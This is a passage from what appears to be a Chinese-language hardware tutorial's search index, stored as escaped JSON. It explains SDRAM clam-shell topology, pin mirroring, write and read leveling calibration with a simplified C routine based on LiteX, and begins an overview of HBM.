<p>\u200b\u4e3a\u4e86\u200b\u8ba9\u200b\u5904\u4e8e\u200b\u4e0d\u540c\u200b\u4f4d\u7f6e\u200b\u7684\u200b SDRAM \u200b\u770b\u5230\u200b\u540c\u6837\u200b\u7684\u200b\u6ce2\u5f62\u200b\uff0c\u200b\u9700\u8981\u200b\u5728\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u4e00\u4fa7\u200b\u7ed9\u200b\u6570\u636e\u4fe1\u53f7\u200b\u52a0\u4e0a\u200b\u53ef\u53d8\u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5ef6\u8fdf\u200b\u9700\u8981\u200b\u7ecf\u8fc7\u200b\u6821\u51c6\u200b\uff0c\u200b\u624d\u80fd\u200b\u77e5\u9053\u200b\u662f\u200b\u591a\u5c11\u200b\u3002</p>"},{"location":"hardware/sdram.html#clam-shell-topology","title":"Clam-shell topology","text":"<p>\u200b\u9664\u4e86\u200b Fly-by topology\uff0c\u200b\u5728\u200b\u4e00\u4e9b\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u8282\u7701\u200b PCB \u200b\u9762\u79ef\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u4f7f\u7528\u200b Clam-shell topology\u3002Clam-shell \u200b\u662f\u200b\u8d1d\u58f3\u200b\u7684\u200b\u610f\u601d\u200b\uff0c\u200b\u8d1d\u58f3\u200b\u6709\u200b\u4e0a\u4e0b\u200b\u4e24\u4e2a\u200b\u90e8\u5206\u200b\u5408\u5728\u4e00\u8d77\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5176\u5b9e\u200b Clam-shell topology \u200b\u5c31\u662f\u200b\u5f62\u8c61\u200b\u5730\u200b\u8868\u793a\u200b\u5728\u200b PCB \u200b\u7684\u200b\u6b63\u9762\u200b\u548c\u200b\u80cc\u9762\u200b\u90fd\u200b\u6709\u200b SDRAM \u200b\u82af\u7247\u200b\u7684\u200b\u60c5\u5f62\u200b\uff1a</p> <p> </p> Clam-shell Topology\uff08\u200b\u56fe\u6e90\u200bVersal ACAP Programmable Network on Chip and Integrated Memory Controller LogiCORE IP Product Guide (PG313) \uff09 <p>\u200b\u8fd9\u79cd\u200b\u8bbe\u8ba1\u200b\u5229\u7528\u200b\u4e86\u200b PCB \u200b\u80cc\u9762\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u4f46\u662f\u200b\u540c\u65f6\u200b\u4e5f\u200b\u5e26\u6765\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b\u95ee\u9898\u200b\uff1a\u200b\u76f4\u89c2\u200b\u5730\u200b\u8bb2\u200b\uff0c\u200b\u5982\u679c\u200b\u4e24\u4e2a\u200b\u82af\u7247\u200b\u90fd\u200b\u653e\u5728\u200b PCB \u200b\u7684\u200b\u6b63\u9762\u200b\uff0c\u200b\u8981\u200b\u8fde\u7ebf\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u5f15\u811a\u200b\u987a\u5e8f\u200b\u63a5\u8fd1\u200b\u4e00\u81f4\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6bd4\u8f83\u200b\u5bb9\u6613\u200b\u5730\u200b\u8fde\u63a5\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u6709\u200b\u5f88\u591a\u200b\u4ea4\u53c9\u200b\u7684\u200b\u5730\u65b9\u200b\u3002\u200b\u4f46\u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b\u5728\u200b\u6b63\u9762\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5728\u200b\u80cc\u9762\u200b\uff0c\u200b\u5f15\u811a\u200b\u7684\u200b\u987a\u5e8f\u200b\u5c31\u200b\u5012\u8f6c\u200b\u8fc7\u6765\u200b\u4e86\u200b\uff0c\u200b\u8fde\u7ebf\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u6bd4\u8f83\u200b\u56f0\u96be\u200b\u3002</p> <p>\u200b\u89e3\u51b3\u200b\u7684\u200b\u529e\u6cd5\u200b\u662f\u200b\uff0c\u200b\u4fee\u6539\u200b\u5f15\u811a\u200b\u7684\u200b\u987a\u5e8f\u200b\uff0c\u200b\u628a\u200b\u4e00\u4e9b\u200b\u5f15\u811a\u200b\u7684\u200b\u529f\u80fd\u200b\u8fdb\u884c\u200b\u5bf9\u8c03\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u8d70\u7ebf\u200b\u66f4\u52a0\u200b\u7b80\u5355\u200b\uff1a</p> <p> </p> SDRAM \u200b\u5f15\u811a\u200b\u955c\u50cf\u200b\uff08\u200b\u56fe\u6e90\u200bVersal ACAP PCB Design User Guide (UG863)\uff09 <p>\u200b\u8868\u683c\u200b\u4e2d\u200b\u7279\u610f\u200b\u6311\u9009\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u7279\u6b8a\u200b\u529f\u80fd\u200b\u7684\u200b\u5f15\u811a\u200b\u6765\u200b\u4ea4\u6362\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5927\u90e8\u5206\u200b\u529f\u80fd\u200b\uff0c\u200b\u5373\u4f7f\u200b\u4ea4\u6362\u200b\u4e86\u200b\u5f15\u811a\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\u3002\u200b\u4f8b\u5982\u200b Row \u200b\u5730\u5740\u200b\u4ea4\u6362\u200b\u4e86\u200b\u51e0\u4e2a\u200b\u4f4d\u200b\uff0c\u200b\u867d\u7136\u200b\u7269\u7406\u200b\u4e0a\u200b\u4fdd\u5b58\u200b\u7684\u200b\u5730\u65b9\u200b\u53d8\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u8bfb\u5199\u200b\u6570\u636e\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u5bf9\u4e8e\u200b Mode Register Set \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5fc5\u987b\u200b\u8981\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u81ea\u884c\u200b\u4ea4\u6362\u200b\u4f4d\u200b\u7684\u200b\u987a\u5e8f\u200b\uff0c\u200b\u5728\u200b PCB \u200b\u4e0a\u200b\u8fde\u63a5\u200b\u65f6\u200b\u518d\u200b\u4ea4\u6362\u200b\u56de\u6765\u200b\uff0c\u200b\u624d\u80fd\u200b\u4fdd\u8bc1\u200b\u5728\u200b SDRAM \u200b\u4e00\u4fa7\u200b\u5f97\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u7ed3\u679c\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0cClam-shell Topology \u200b\u7684\u200b\u6b63\u9762\u200b\u548c\u200b\u80cc\u9762\u200b\u5404\u6709\u200b\u4e00\u4e2a\u200b cs_n \u200b\u7247\u9009\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u200b\u548c\u200b Dual Rank \u200b\u4e0d\u540c\u200b\uff1aDual Rank \u200b\u662f\u200b\u6b63\u9762\u200b\u548c\u200b\u80cc\u9762\u200b\u90fd\u200b\u6709\u200b\u540c\u6837\u200b\u6570\u91cf\u200b\u7684\u200b DRAM \u200b\u82af\u7247\u200b\uff0c\u200b\u5171\u4eab\u200b\u5730\u5740\u200b\u4fe1\u53f7\u200b\u3001\u200b\u6570\u636e\u4fe1\u53f7\u200b\u548c\u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u540c\u4e00\u65f6\u95f4\u200b\u53ea\u6709\u200b\u4e00\u4fa7\u200b\u7684\u200b DRAM \u200b\u82af\u7247\u200b\u5728\u200b\u4f7f\u7528\u200b\uff0c\u200b\u597d\u5904\u200b\u662f\u200b\u5185\u5b58\u5bb9\u91cf\u200b\u7ffb\u500d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e24\u4e2a\u200b rank \u200b\u53ef\u4ee5\u200b\u4e92\u76f8\u200b\u63a9\u76d6\u200b\u5ef6\u8fdf\u200b\uff1b\u200b\u800c\u200b Clam Shell Topology \u200b\u7684\u200b\u4e24\u4e2a\u200b cs_n \u200b\u662f\u200b\u4e3a\u4e86\u200b\u7ed9\u200b Mode Register Set \u200b\u64cd\u4f5c\u200b\u6307\u5b9a\u200b\u6b63\u9762\u200b\u6216\u200b\u80cc\u9762\u200b\uff0c\u200b\u800c\u200b\u5176\u4f59\u200b\u7684\u200b\u5927\u90e8\u5206\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6b63\u9762\u200b\u548c\u200b\u80cc\u9762\u200b\u540c\u65f6\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u4eec\u200b\u7684\u200b\u6570\u636e\u4fe1\u53f7\u200b\u5e76\u200b\u6ca1\u6709\u200b\u5171\u4eab\u200b\u3002</p>"},{"location":"hardware/sdram.html#_10","title":"\u6821\u51c6","text":"<p>SDRAM \u200b\u6821\u51c6\u200b\uff0c\u200b\u6216\u8005\u8bf4\u200b SDRAM \u200b\u8bad\u7ec3\u200b\uff0c\u200b\u4e3b\u8981\u200b\u6709\u200b\u5982\u4e0b\u200b\u51e0\u4e2a\u200b\u6b65\u9aa4\u200b\uff1a</p> <ol> <li>Write Leveling</li> <li>Read Leveling</li> </ol>"},{"location":"hardware/sdram.html#write-leveling","title":"Write Leveling","text":"<p>Write Leveling \u200b\u8981\u200b\u89e3\u51b3\u200b\u7684\u200b\u662f\u200b Fly-by Topology \u200b\u5e26\u6765\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u4e0d\u200b\u4e00\u81f4\u200b\uff0c\u200b\u5bfc\u81f4\u200b SDRAM \u200b\u770b\u5230\u200b\u9519\u8bef\u200b\u7684\u200b\u4fe1\u53f7\u200b\u7684\u200b\u95ee\u9898\u200b\u3002\u200b\u5177\u4f53\u200b\u5730\u200b\u8bb2\u200b\uff0cWrite Leveling \u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u8ba9\u200b SDRAM \u200b\u82af\u7247\u200b\u63a5\u53d7\u200b\u5230\u200b\u7684\u200b DQS \u200b\u4fe1\u53f7\u200b\u4e0e\u200b CK \u200b\u4fe1\u53f7\u200b\u540c\u6b65\u200b\uff1a</p> <p> </p> Write Leveling \u200b\u6240\u200b\u8981\u200b\u8fbe\u5230\u200b\u7684\u200b DQS \u200b\u4e0e\u200b CK \u200b\u540c\u6b65\u200b\u7684\u200b\u6548\u679c\u200b <p>\u200b\u4e3a\u4e86\u200b\u8fbe\u5230\u200b\u8fd9\u4e2a\u200b\u76ee\u7684\u200b\uff0c\u200b\u601d\u8def\u200b\u5c31\u662f\u200b\u4e0d\u65ad\u200b\u8c03\u6574\u200b DQS \u200b\u8f93\u51fa\u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u89c2\u6d4b\u200b\u4e0d\u540c\u200b\u5ef6\u8fdf\u200b\u4e0b\u200b\u7684\u200b\u884c\u4e3a\u200b\uff0c\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b DQS \u200b\u4e0e\u200b CK \u200b\u540c\u6b65\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u503c\u200b\u3002\u200b\u4e3a\u4e86\u200b\u914d\u5408\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u505a\u200b Write Leveling\uff0cSDRAM \u200b\u53ef\u4ee5\u200b\u8fdb\u5165\u200b\u4e00\u4e2a\u200b Write Leveling Mode\uff0c\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u72b6\u6001\u200b\u4e0b\u200b\uff0cSDRAM \u200b\u4f1a\u200b\u5728\u200b DQS \u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u5bf9\u200b CK \u200b\u8fdb\u884c\u200b\u91c7\u6837\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u7ed3\u679c\u200b\u8f93\u51fa\u200b\u5230\u200b DQ \u200b\u4e0a\u200b\u3002\u200b\u6b64\u65f6\u200b\uff0c\u200b\u4e0d\u540c\u200b\u7684\u200b DQS \u200b\u5ef6\u8fdf\u200b\u5c31\u200b\u4f1a\u200b\u5e26\u6765\u200b\u4e0d\u540c\u200b\u7684\u200b\u7ed3\u679c\u200b\uff1a</p> <p> </p> \u200b\u4e0d\u540c\u200b\u7684\u200b DQS \u200b\u5ef6\u8fdf\u200b\u4e0b\u200b\uff0cDQS \u200b\u5bf9\u200b CK \u200b\u91c7\u6837\u200b\u7684\u200b\u7ed3\u679c\u200b <p>\u200b\u4e0a\u56fe\u200b\u4e2d\u200b delay0 \u200b\u548c\u200b delay1 \u200b\u4e24\u79cd\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cDQS \u200b\u91c7\u6837\u200b\u5230\u200b\u4e86\u200b CK \u200b\u7684\u200b\u8d1f\u534a\u200b\u5468\u671f\u200b\uff0c\u200b\u800c\u200b delay2 \u200b\u548c\u200b delay3 \u200b\u65f6\u200b DQS \u200b\u91c7\u6837\u200b\u5230\u200b\u4e86\u200b CK \u200b\u7684\u200b\u6b63\u534a\u200b\u5468\u671f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u8ba9\u200b DQS \u200b\u548c\u200b CK \u200b\u540c\u6b65\u200b\uff0c\u200b\u5e94\u8be5\u200b\u628a\u200b DQS \u200b\u5ef6\u8fdf\u200b\u8bbe\u7f6e\u200b\u5728\u200b delay1 \u200b\u548c\u200b delay2 \u200b\u4e4b\u95f4\u200b\u3002</p> <p>\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b Write Leveling \u200b\u7684\u200b\u7b97\u6cd5\u200b\uff1a</p> <ol> <li>\u200b\u8bbe\u7f6e\u200b SDRAM \u200b\u8fdb\u5165\u200b Write Leveling \u200b\u6a21\u5f0f\u200b\uff0c\u200b\u6b64\u65f6\u200b SDRAM \u200b\u4f1a\u200b\u4f7f\u7528\u200b DQS \u200b\u5bf9\u200b CK \u200b\u91c7\u7528\u200b\uff0c\u200b\u628a\u200b\u7ed3\u679c\u200b\u8f93\u51fa\u200b\u5230\u200b DQ</li> <li>\u200b\u63a7\u5236\u5668\u200b\u679a\u4e3e\u200b DQS \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u8bfb\u200b\u53d6\u51fa\u200b\u6bcf\u4e2a\u200b DQS \u200b\u5ef6\u8fdf\u200b\u4e0b\u200b\u7684\u200b DQ \u200b\u7ed3\u679c\u200b\uff0c\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b 0-1 \u200b\u4e32\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a<code>001111111111111111110000</code>\uff0c\u200b\u5373\u200b\u968f\u7740\u200b\u5ef6\u8fdf\u200b\u589e\u5927\u200b\uff0c\u200b\u5148\u200b\u91c7\u6837\u200b\u5230\u200b 0\uff0c\u200b\u518d\u200b\u91c7\u6837\u200b\u5230\u200b 1\uff0c\u200b\u6700\u540e\u200b\u53c8\u200b\u91c7\u6837\u200b\u5230\u200b 0</li> <li>\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b DQS \u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u4f7f\u5f97\u200b DQ \u200b\u51fa\u73b0\u200b\u4e00\u4e2a\u200b\u4ece\u200b 0 \u200b\u5230\u200b 1 \u200b\u7684\u200b\u53d8\u5316\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6309\u7167\u200b\u8fd9\u4e2a\u200b\u5ef6\u8fdf\u200b\u8f93\u51fa\u200b\uff0cDQS \u200b\u5c31\u200b\u4f1a\u200b\u4e0e\u200b CK \u200b\u540c\u6b65\u200b</li> <li>\u200b\u8bbe\u7f6e\u200b SDRAM \u200b\u7ed3\u675f\u200b Write Leveling \u200b\u6a21\u5f0f\u200b</li> </ol> <p>\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u8981\u200b\u5bf9\u200b\u6bcf\u4e2a\u200b DQS \u200b\u4fe1\u53f7\u200b\u5206\u522b\u200b\u8fdb\u884c\u200b\u3002\u200b\u4e0b\u9762\u200b\u4ee5\u200b litex \u200b\u7684\u200b SDRAM \u200b\u6821\u51c6\u200b\u4ee3\u7801\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u7528\u200b C \u200b\u4ee3\u7801\u200b\u5b9e\u73b0\u200b\u7b80\u5316\u200b\u7684\u200b\u6d41\u7a0b\u200b\uff1a</p> int sdram_write_leveling_scan(int *delays, int loops, int show)<pre><code>/* \u200b\u6253\u5f00\u200b SDRAM \u200b\u7684\u200b Write Leveling \u200b\u6a21\u5f0f\u200b */\nsdram_write_leveling_on();\n\n/* \u200b\u5faa\u73af\u200b\u6bcf\u4e2a\u200b SDRAM \u200b\u5185\u5b58\u6761\u200b */\nfor(i=0;i&lt;SDRAM_PHY_MODULES;i++) {\n  /* \u200b\u5faa\u73af\u200b\u6bcf\u4e2a\u200b DQS \u200b\u4fe1\u53f7\u200b */\n  for (dq_line = 0; dq_line &lt; DQ_COUNT; dq_line++) {\n    /* \u200b\u8bbe\u7f6e\u200b DQS \u200b\u521d\u59cb\u200b\u5ef6\u8fdf\u200b\u4e3a\u200b 0 */\n    sdram_leveling_action(i, dq_line, write_rst_delay);\n\n    /* \u200b\u5faa\u73af\u200b DQS \u200b\u5ef6\u8fdf\u200b */\n    for(j=0;j&lt;err_ddrphy_wdly;j++) {\n      int zero_count = 0;\n      int one_count = 0;\n\n      /* \u200b\u591a\u6b21\u200b\u91c7\u6837\u200b */\n      for (k=0; k&lt;loops; k++) {\n        /* \u200b\u53d1\u9001\u200b DQS \u200b\u5e8f\u5217\u200b\uff1a00000001 */\n        /* SDRAM \u200b\u5bf9\u200b CK \u200b\u8fdb\u884c\u200b\u91c7\u6837\u200b */\n        ddrphy_wlevel_strobe_write(1);\n\n        cdelay(100);\n        /* \u200b\u4ece\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u4e2d\u200b\u8bfb\u51fa\u200b DQ \u200b\u4e0a\u200b\u7684\u200b\u6570\u636e\u200b */\n        csr_rd_buf_uint8(sdram_dfii_pix_rddata_addr(0), buf, DFII_PIX_DATA_BYTES);\n\n        /* \u200b\u7edf\u8ba1\u200b 1 \u200b\u548c\u200b 0 \u200b\u7684\u200b\u4e2a\u6570\u200b */\n        if (buf[SDRAM_PHY_MODULES-1-i] != 0)\n          one_count++;\n        else\n          zero_count++;\n      }\n      if (one_count &gt; zero_count)\n        /* \u200b\u8ba4\u4e3a\u200b DQS \u200b\u91c7\u6837\u200b\u5230\u200b\u4e86\u200b CK \u200b\u7684\u200b\u6b63\u534a\u200b\u5468\u671f\u200b */\n        taps_scan[j] = 1;\n      else\n        /* \u200b\u8ba4\u4e3a\u200b DQS \u200b\u91c7\u6837\u200b\u5230\u200b\u4e86\u200b CK \u200b\u7684\u200b\u8d1f\u534a\u200b\u5468\u671f\u200b */\n        taps_scan[j] = 0;\n\n      /* \u200b\u6bcf\u6b21\u200b\u5faa\u73af\u200b\u589e\u52a0\u200b\u4e00\u6b21\u200b DQS \u200b\u5ef6\u8fdf\u200b */\n      sdram_leveling_action(i, dq_line, write_inc_delay);\n    }\n\n    /* \u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u6700\u957f\u200b\u7684\u200b\u8fde\u7eed\u200b 1 \u200b\u7684\u200b\u5e8f\u5217\u200b */\n    one_window_active = 0;\n    one_window_start = 0;\n    one_window_count = 0;\n    one_window_best_start = 0;\n    one_window_best_count = -1;\n    for(j=0;j&lt;err_ddrphy_wdly+1;j++) {\n      if (one_window_active) {\n        if ((j == err_ddrphy_wdly) || (taps_scan[j] == 0)) {\n          /* \u200b\u7ed3\u675f\u200b\u4e86\u200b\u4e00\u6bb5\u200b\u8fde\u7eed\u200b\u7684\u200b 1 */\n          one_window_active = 0;\n          one_window_count = j - one_window_start;\n          /* \u200b\u8bb0\u5f55\u200b\u6700\u957f\u200b\u7684\u200b\u8fde\u7eed\u200b 1 \u200b\u7684\u200b\u957f\u5ea6\u200b\u548c\u200b\u4f4d\u7f6e\u200b */\n          if (one_window_count &gt; one_window_best_count) {\n            one_window_best_start = one_window_start;\n            one_window_best_count = one_window_count;\n          }\n        }\n      } else {\n        /* \u200b\u627e\u5230\u200b\u8fde\u7eed\u200b\u7684\u200b 1 \u200b\u7684\u200b\u5f00\u5934\u200b */\n        if (j != err_ddrphy_wdly &amp;&amp; taps_scan[j]) {\n          one_window_active = 1;\n          one_window_start = j;\n        }\n      }\n    }\n\n    /* \u200b\u8981\u200b\u627e\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u5c31\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b 1 \u200b\u5e8f\u5217\u200b\u7684\u200b\u5f00\u59cb\u200b\u4f4d\u7f6e\u200b */\n    delays[i] = one_window_best_start;\n  }\n}\n\n/* \u200b\u5173\u95ed\u200b SDRAM \u200b\u7684\u200b Write Leveling \u200b\u6a21\u5f0f\u200b */\nsdram_write_leveling_off();\n</code></pre>"},{"location":"hardware/sdram.html#read-leveling","title":"Read Leveling","text":"<p>\u200b\u5728\u200b Write Leveling \u200b\u9636\u6bb5\u200b\uff0c\u200b\u89e3\u51b3\u200b\u4e86\u200b SDRAM \u200b\u5904\u200b\u4fe1\u53f7\u200b\u7684\u200b\u540c\u6b65\u200b\u95ee\u9898\u200b\u3002\u200b\u4f46\u662f\u200b\u5bf9\u4e8e\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6570\u636e\u200b\u662f\u4ece\u200b SDRAM \u200b\u53d1\u9001\u7ed9\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u4e0d\u540c\u200b\u7684\u200b\u6570\u636e\u200b\u5230\u8fbe\u200b\u63a7\u5236\u5668\u200b\u7684\u200b\u65f6\u95f4\u200b\u53ef\u80fd\u200b\u4e5f\u200b\u4e0d\u540c\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e5f\u200b\u9700\u8981\u200b\u5bf9\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u8fdb\u884c\u200b\u6821\u51c6\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u5224\u65ad\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\uff0c\u200b\u505a\u6cd5\u200b\u662f\u200b\u9996\u5148\u200b\u5199\u5165\u200b\u5df2\u77e5\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u518d\u200b\u8bfb\u51fa\u6765\u200b\uff0c\u200b\u5982\u679c\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\u548c\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u5b8c\u5168\u4e00\u81f4\u200b\uff0c\u200b\u5c31\u200b\u8bf4\u660e\u200b\u53ef\u4ee5\u200b\u6b63\u786e\u200b\u5730\u200b\u8fdb\u884c\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u3002</p> <p>\u200b\u5b9e\u73b0\u200b\u601d\u8def\u200b\u548c\u200b Write Leveling \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u679a\u4e3e\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u8fdb\u884c\u200b\u4e00\u4e9b\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u89c2\u5bdf\u200b\u6bcf\u4e2a\u200b\u5ef6\u8fdf\u200b\u4e0b\u200b\u7684\u200b\u8f93\u51fa\u200b\uff1a</p> <ol> <li>\u200b\u5199\u5165\u200b\u6570\u636e\u200b\uff08\u200b\u6216\u8005\u200b\u7528\u200b SDRAM \u200b\u7684\u200b\u751f\u6210\u200b\u56fa\u5b9a\u200b Pattern \u200b\u8f93\u51fa\u200b\u7684\u200b\u529f\u80fd\u200b\uff09</li> <li>\u200b\u8bbe\u7f6e\u200b\u5ef6\u8fdf\u200b\u4ece\u200b 0 \u200b\u5f00\u59cb\u200b\u5faa\u73af\u200b\uff0c\u200b\u4e0d\u65ad\u200b\u589e\u5927\u200b</li> <li>\u200b\u5728\u200b\u6bcf\u4e2a\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u8bbe\u5b9a\u200b\u4e0b\u200b\uff0c\u200b\u8bfb\u200b\u53d6\u51fa\u200b\u6570\u636e\u200b\uff0c\u200b\u628a\u200b\u8bfb\u53d6\u200b\u7684\u200b\u7ed3\u679c\u200b\u4e0e\u200b\u4e4b\u524d\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u8fdb\u884c\u200b\u6bd4\u8f83\u200b</li> <li>\u200b\u7edf\u8ba1\u200b\u51fa\u200b\u54ea\u4e9b\u200b\u5ef6\u8fdf\u200b\u6761\u4ef6\u200b\u4e0b\u200b\uff0c\u200b\u8bfb\u53d6\u6570\u636e\u200b\u662f\u200b\u51c6\u786e\u200b\u7684\u200b\uff0c\u200b\u51c6\u786e\u200b\u7684\u200b\u8bb0\u4e3a\u200b 1\uff0c\u200b\u4e0d\u200b\u51c6\u786e\u200b\u7684\u200b\u8bb0\u4e3a\u200b 0</li> <li>\u200b\u627e\u5230\u200b\u8868\u793a\u200b\u51c6\u786e\u200b\u7684\u200b 1 \u200b\u7684\u200b\u8303\u56f4\u200b\uff0c\u200b\u53d6\u4e2d\u70b9\u200b\u4f5c\u4e3a\u200b\u6700\u7ec8\u200b\u7684\u200b\u6821\u51c6\u200b\u7ed3\u679c\u200b</li> </ol> <p>\u200b\u6ce8\u610f\u200b\u8fd9\u91cc\u200b\u4e0d\u518d\u200b\u662f\u200b\u627e\u5230\u200b 0-1 \u200b\u7684\u200b\u53d8\u5316\u200b\u7684\u200b\u5730\u65b9\u200b\uff0cWrite Leveling \u200b\u627e\u200b 0-1 \u200b\u53d8\u5316\u200b\u662f\u200b\u4e3a\u4e86\u200b\u540c\u6b65\u200b\uff0c\u200b\u540c\u6b65\u200b\u7684\u200b\u5730\u65b9\u200b\u6b63\u662f\u200b 0-1 \u200b\u53d8\u5316\u200b\u7684\u200b\u5730\u65b9\u200b\uff1b\u200b\u800c\u200b Read Leveling \u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u8981\u200b\u8bfb\u200b\u53d6\u51fa\u200b\u6b63\u786e\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5df2\u77e5\u200b\u6709\u200b\u4e00\u6bb5\u200b\u8fde\u7eed\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u533a\u95f4\u200b\uff0c\u200b\u533a\u95f4\u200b\u5185\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u8bfb\u51fa\u200b\u6b63\u786e\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53d6\u200b\u5176\u4e2d\u200b\u70b9\u200b\uff0c\u200b\u5373\u4f7f\u200b\u56e0\u4e3a\u200b\u6e29\u5ea6\u200b\u7b49\u200b\u6761\u4ef6\u200b\u53d8\u5316\u200b\uff0c\u200b\u533a\u95f4\u200b\u51fa\u73b0\u200b\u79fb\u52a8\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u4fdd\u7559\u200b\u4e86\u200b\u8db3\u591f\u200b\u7684\u200b\u4f59\u91cf\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4f9d\u7136\u200b\u53ef\u4ee5\u200b\u5de5\u4f5c\u200b\u3002\u200b\u53d6\u4e2d\u70b9\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u4e5f\u200b\u79f0\u4e3a\u200b Read Centering\u3002</p>"},{"location":"hardware/sdram.html#hbm","title":"HBM","text":"<p>HBM \u200b\u5168\u79f0\u200b\u662f\u200b High Bandwidth Memory\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u9ad8\u5e26\u5bbd\u200b\u5185\u5b58\u200b\uff0c\u200b\u5176\u200b\u6280\u672f\u200b\u4e5f\u200b\u662f\u200b\u57fa\u4e8e\u200b SDRAM\uff0c\u200b\u56e0\u6b64\u200b\u653e\u5728\u200b\u8fd9\u91cc\u200b\u548c\u200b DDR SDRAM \u200b\u8fdb\u884c\u200b\u5bf9\u6bd4\u200b\u3002</p> <p>HBM \u200b\u76f8\u6bd4\u200b\u524d\u9762\u200b\u7684\u200b DDR SDRAM\uff0c\u200b\u5b83\u200b\u5806\u53e0\u200b\u4e86\u200b\u591a\u4e2a\u200b SDRAM\uff0c\u200b\u63d0\u4f9b\u200b\u591a\u4e2a\u200b channel \u200b\u5e76\u4e14\u200b\u63d0\u9ad8\u200b\u4e86\u200b\u4f4d\u200b\u5bbd\u200b\u3002\u200b\u4f8b\u5982\u200b Micron HBM with ECC\uff0c\u200b\u5806\u53e0\u200b\u4e86\u200b 4/8 \u200b\u5c42\u200b DRAM\uff0c\u200b\u63d0\u4f9b\u200b\u4e86\u200b 8 \u200b\u4e2a\u200b channel\uff0c\u200b\u6bcf\u4e2a\u200b channel \u200b\u7684\u200b\u6570\u636e\u200b\u5bbd\u5ea6\u200b\u662f\u200b 128 \u200b\u4f4d\u200b\uff0c\u200b\u4ee5\u200b 3200 MT/s \u200b\u8ba1\u7b97\u200b\uff0c\u200b\u4e00\u4e2a\u200b HBM 